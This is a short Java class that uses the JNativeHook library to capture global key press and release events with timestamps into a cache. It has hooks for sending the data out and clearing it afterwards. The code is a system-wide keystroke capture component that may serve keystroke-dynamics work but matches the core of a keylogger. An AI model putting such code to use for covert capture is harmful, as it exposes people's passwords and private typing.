/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keys;

import java.util.ArrayList;
import java.util.List;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;

import handlers.keyStorage;
/**
 *
 * @author RITIK
 */
public class NativeKeyboard implements NativeKeyListener{
    private  List<keyStorage> keyCache = new ArrayList<>();

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        keyCache.add(new keyStorage(nke.getKeyCode(), true , System.currentTimeMillis()));//To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
       keyCache.add(new keyStorage(nke.getKeyCode(),false,System.currentTimeMillis()));//To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        //To change body of generated methods, choose Tools | Templates.
    }
    
    public void onSend()
    { keyCache.clear();
    }
    
    public void onFail(){
        System.out.println("keystroke data failed to be sent.");
    }

    public List<keyStorage> getKeyCache() {
        return keyCache;
    }
    
    
    }

    
